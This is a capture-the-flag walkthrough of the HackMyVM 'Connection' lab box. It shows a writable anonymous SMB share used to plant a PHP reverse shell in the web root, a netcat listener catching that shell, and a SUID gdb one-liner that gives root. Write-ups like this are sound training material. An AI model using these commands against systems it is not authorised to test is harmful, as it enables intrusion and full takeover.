---
title: "hackmyvm: connection"
author: am-a-circle
date: 2021-04-15 12:00:00 
categories: [hackmyvm]
tags: [SUID,easy]
math: false
mermaid: false
---



## Overview



|Box Difficulty| Link|
|--|--|
| Easy | [hackmyvm Link](https://hackmyvm.eu/machines/machine.php?vm=Connection) |


Another easy box! This time, I'll practice writing things in detail. 

## Recon

Objective : Find out all the open ports and do a nmap service scan.

```bash
┌──(root💀kali)-[/opt/hackmyv/connection]                                                                                                                                 
└─#  rustscan -a 192.168.56.20                                                                                                                                      
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                                                                                  
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |                                                                                                                  
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |                                                                                                                  
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'                                                                                                                  
The Modern Day Port Scanner.                                                                                                                                              
________________________________________                                                                                                                                  
: https://discord.gg/GFrQsGy           :                                                                                                                                  
: https://github.com/RustScan/RustScan :                                                                                                                                  
 --------------------------------------                                                                                                                                   
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan                                                                                          
                                                                                                                                                                          
[~] The config file is expected to be at "/root/.rustscan.toml"                                                                                                           
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers                                                       
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'.                                
Open 192.168.56.20:22                                                                                                                                                     
Open 192.168.56.20:80                                                                                                                                                     
Open 192.168.56.20:139                                                                                                                                                    
Open 192.168.56.20:445 

```
4 open port. 
Port 22,80,139 and 445.

nmap output shows the below:

```bash
┌──(root💀kali)-[/opt/hackmyv/connection]                                                                                                                                 
└─# nmap -sV -sC -p 22,80,139,445 192.168.56.20 -o nmap.txt                                                                                                               
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 01:50 EST                                                                                                           
Nmap scan report for 192.168.56.20                                                                                                                                        
Host is up (0.00042s latency).                                                                                                                                            
                                                                                                                                                                          
PORT    STATE SERVICE     VERSION                                                                                                                                         
22/tcp  open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                                                                                  
| ssh-hostkey:                                                                                                                                                            
|   2048 b7:e6:01:b5:f9:06:a1:ea:40:04:29:44:f4:df:22:a1 (RSA)                                                                                                            
|   256 fb:16:94:df:93:89:c7:56:85:84:22:9e:a0:be:7c:95 (ECDSA)                                                                                                           
|_  256 45:2e:fb:87:04:eb:d1:8b:92:6f:6a:ea:5a:a2:a1:1c (ED25519)                                                                                                         
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))                                                                                                                  
|_http-server-header: Apache/2.4.38 (Debian)                                                                                                                              
|_http-title: Apache2 Debian Default Page: It works                                                                                                                       
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:8B:A8:90 (Oracle VirtualBox virtual NIC)
Service Info: Host: CONNECTION; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: CONNECTION, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2021-12-24T01:50:47-05:00 
| smb2-time: 
|   date: 2021-12-24T06:50:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.42 seconds




```

Let's enumerate further !

## HTTP - 80 

Nikto shows that there's really nothing much to work on.
```bash
┌──(root💀kali)-[/opt/hackmyv/connection]
└─# nikto -ask=no -h 192.168.56.20:80 2>&1 | tee nikto_P80.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.20
+ Target Hostname:    192.168.56.20
+ Target Port:        80
+ Start Time:         2021-12-24 01:53:31 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 29cd, size: 5aff148b501f6, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7915 requests: 0 error(s) and 6 item(s) reported on remote host
+ End Time:           2021-12-24 01:54:24 (GMT-5) (53 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Looks like there's really nothing much basic the basic  **Apache2 Debian Default Page**  from index.html.

```bash
┌──(root💀kali)-[/opt/hackmyv/connection]
└─# gobuster dir -u http://192.168.56.20:80 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,php.bak,bak,jsp" -o gobuster_p80.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.20:80
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,php.bak,bak,jsp,txt,html
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2021/12/24 01:54:09 Starting gobuster in directory enumeration mode
===============================================================
http://192.168.56.20:80/index.html           (Status: 200) [Size: 10701]
http://192.168.56.20:80/server-status        (Status: 403) [Size: 278]  
                                                                        
===============================================================
2021/12/24 01:56:36 Finished
===============================================================                                                   
```

Let's skip this for now.


## SMB- TCP 139/445

Enumerating Samba shows that the `\\192.168.56.20\IPC$` has anonymous read/write access!
```
```bash
──(root💀kali)-[/opt/hackmyv/connection]                                                                                                                                 
└─# nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-os-discovery.nse,smb-security-mode.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms
07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse 192.168.56.20 -p 139,445                                                                     
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-24 01:58 EST                                                                                                           
Nmap scan report for 192.168.56.20                                                                                                                                        
Host is up (0.00046s latency).                                                                                                                                            
                                                                                                                                                                          
PORT    STATE SERVICE                                                                                                                                                     
139/tcp open  netbios-ssn                                                                                                                                                 
445/tcp open  microsoft-ds                                                                                                                                                
MAC Address: 08:00:27:8B:A8:90 (Oracle VirtualBox virtual NIC)                                                                                                            
                                                                                                                                                                          
Host script results:                                                                                                                                                      
| smb-enum-shares:                                                                                                                                                        
|   account_used: <blank>                                                                                                                                                 
|   \\192.168.56.20\IPC$:                                                                                                                                                 
|     Type: STYPE_IPC_HIDDEN                                                                                                                                              
|     Comment: IPC Service (Private Share for uploading files)                                                                                                            
|     Users: 1                                                                                                                                                            
|     Max Users: <unlimited>                                                                                                                                              
|     Path: C:\tmp                                                                                                                                                        
|     Anonymous access: READ/WRITE                                                                                                                                        
|   \\192.168.56.20\print$:                                                                                                                                               
|     Type: STYPE_DISKTREE                                                                                                                                                
|     Comment: Printer Drivers                                                                                                                                            
|     Users: 0                                                                                                                                                            
|     Max Users: <unlimited>                                                                                                                                              
|     Path: C:\var\lib\samba\printers                                                                                                                                     
|     Anonymous access: <none>                                                                                                                                            
|   \\192.168.56.20\share:                                                                                                                                                
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\www
|_    Anonymous access: READ
| smb-ls: Volume \\192.168.56.20\share
| SIZE   TIME                 FILENAME
| <DIR>  2020-09-23T01:48:39  .
| <DIR>  2020-09-23T01:48:39  ..
| <DIR>  2020-09-23T02:20:00  html
| 10701  2020-09-23T01:48:45  html\index.html
|_
|_smb-vuln-ms10-054: false
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb-vuln-ms10-061: false
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: connection
|   NetBIOS computer name: CONNECTION\x00
|   Domain name: \x00
|   FQDN: connection
|_  System time: 2021-12-24T01:58:59-05:00 

Nmap done: 1 IP address (1 host up) scanned in 5.78 seconds

```

After enumerating we can see that the IPC$ folder hold the web directory files.

```bash
┌──(root💀kali)-[/opt/hackmyv/connection]
└─# smbclient //192.168.56.20/share                                                                                                                                   
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Sep 22 21:48:39 2020
  ..                                  D        0  Tue Sep 22 21:48:39 2020
  html                                D        0  Tue Sep 22 22:20:00 2020

                7158264 blocks of size 1024. 5267640 blocks available
smb: \> cd html
smb: \html\> dir
  .                                   D        0  Tue Sep 22 22:20:00 2020
  ..                                  D        0  Tue Sep 22 21:48:39 2020
  index.html                          N    10701  Tue Sep 22 21:48:45 2020

                7158264 blocks of size 1024. 5267640 blocks available
```

Let's upload a test file to see if our test.html is upoladed onto the server as well.

> Creating test.xt

```bash
┌──(root💀kali)-[/opt/hackmyv/connection]
└─# echo "hello world " >> test.txt
                                                                                                                                                                          
                                                                                                                                                                          
┌──(root💀kali)-[/opt/hackmyv/connection]
└─# cat test.txt                                                                                                                                                   
hello world 
```

Upload file onto machine through smb anonymous connection.
```bash
┌──(root💀kali)-[/opt/hackmyv/connection]
└─# smbclient //192.168.56.20/share
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> cd html\
smb: \html\> put test.txt 
putting file test.txt as \html\test.txt (4.2 kb/s) (average 4.2 kb/s)
smb: \html\> 
```

After checking, it does look like the file exist on the server! This means we can upload a .php reverse shell!
```bash
┌──(root💀kali)-[/opt/hackmyv/connection]
└─# curl http://192.168.56.20/test.txt
hello world 

 ```


## Shell as www-data

Let's upload a reverse shell:
I usually use the one from this git repo : [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)	
```bash
┌──(root💀kali)-[/opt/hackmyv/connection]
└─# smbclient //192.168.56.20/share                    
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> cd html\
smb: \html\> put php-reverse-shell.php 
putting file php-reverse-shell.php as \html\php-reverse-shell.php (2682.5 kb/s) (average 2682.6 kb/s)
smb: \html\> 
```

Catching the reverse shell on our local machine 

```bash
┌──(root💀kali)-[/opt/hackmyv/connection]
└─# nc -lvnp 1234                                  
listening on [any] 1234 ...
connect to [192.168.56.3] from (UNKNOWN) [192.168.56.20] 40256
Linux connection 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux
 02:16:28 up 29 min,  0 users,  load average: 0.00, 0.53, 3.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ python3 -c 'import pty; pty.spawn("/bin/sh")'
```

Further enumeration shows that there's no wget , so I have to upload the linpeas.sh through SMB instead.

```bash
$ which awk perl python python3 ruby gcc cc vi vim nmap find netcat nc wget tftp ftp php 2>/dev/null
which awk perl python python3 ruby gcc cc vi vim nmap find netcat nc wget tftp ftp php 2>/dev/null
/usr/bin/awk
/usr/bin/perl
/usr/bin/python
/usr/bin/python3
/usr/bin/vi
/usr/bin/find
/usr/bin/php
```

```bash
┌──(root💀kali)-[/opt/hackmyv/connection]
└─# smbclient //192.168.56.20/share         
Enter WORKGROUP\root's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> cd html\
smb: \html\> put linpeas.sh 
putting file linpeas.sh as \html\linpeas.sh (80606.7 kb/s) (average 80608.6 kb/s)
smb: \html\> 
```

On the victim machine , transfer linpeas over.
```bash
$ cd /var/www/html
cd /var/www/html
$ ls -la
ls -la
total 356
drwxrwxrwx 2 root   root      4096 Dec 24 02:21 .
drwxr-xr-x 3 root   root      4096 Sep 22  2020 ..
-rwxrwxrwx 1 root   root     10701 Sep 22  2020 index.html
-rwxr--r-- 1 nobody nogroup 330173 Dec 24 02:21 linpeas.sh
-rwxr--r-- 1 nobody nogroup   5494 Dec 24 02:15 php-reverse-shell.php
-rwxr--r-- 1 nobody nogroup     13 Dec 24 02:06 test.txt
$ cp linpeah.sh /tmp
cp linpeah.sh /tmp
cp: cannot stat 'linpeah.sh': No such file or directory
$ cd linpeas.sh /tmp
cd linpeas.sh /tmp
/bin/sh: 19: cd: can't cd to linpeas.sh
$ cp linpeas.sh /tmp
cp linpeas.sh /tmp
```

## Shell as Root


```bash
$ bash linpeas.sh                                                                                                                                                         
bash linpeas.sh
…..
════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════                                                                             
[+] SUID - Check easy privesc, exploits and write perms                                                                                                                   
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                             
strings Not Found                                                                                                                                                         
strace Not Found                                                                                                                                                          
-rwsr-xr-x 1 root root        10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device                                                                                          
-rwsr-xr-x 1 root root        63K Jul 27  2018 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)             
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/newgrp  --->  HP-UX_10.20                                                                                         
-rwsr-xr-x 1 root root        83K Jul 27  2018 /usr/bin/gpasswd                                                                                                           
-rwsr-xr-x 1 root root        44K Jul 27  2018 /usr/bin/chsh                                                                                                              
-rwsr-xr-x 1 root root        53K Jul 27  2018 /usr/bin/chfn  --->  SuSE_9.3/10                                                                                           
-rwsr-xr-x 1 root root        35K Jan 10  2019 /usr/bin/umount  --->  BSD/Linux(08-1996)                                                                                  
-rwsr-xr-x 1 root root        63K Jan 10  2019 /usr/bin/su                                                                                                                
-rwsr-xr-x 1 root root        51K Jan 10  2019 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                        
-rwsr-sr-x 1 root root       7.7M Oct 14  2019 /usr/bin/gdb                                                                                                               
-rwsr-xr-x 1 root root       427K Jan 31  2020 /usr/lib/openssh/ssh-keysign                                                                                               
-rwsr-xr-- 1 root messagebus  50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

We can see that gdb can be executed as root!
**Explanation :** This mean that it  has setuid (SUID) bit. When set, files will get executed with the privileges of the file owner.

Reading from https://gtfobins.github.io/gtfobins/gdb/#suid , we can see that to exploit this we can execute the command to run GDB as root and run a bash shell.

```bash
$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
GNU gdb (Debian 8.2.1-2+b3) 8.2.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
# whoami
whoami
root
# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)

```

Rooted!
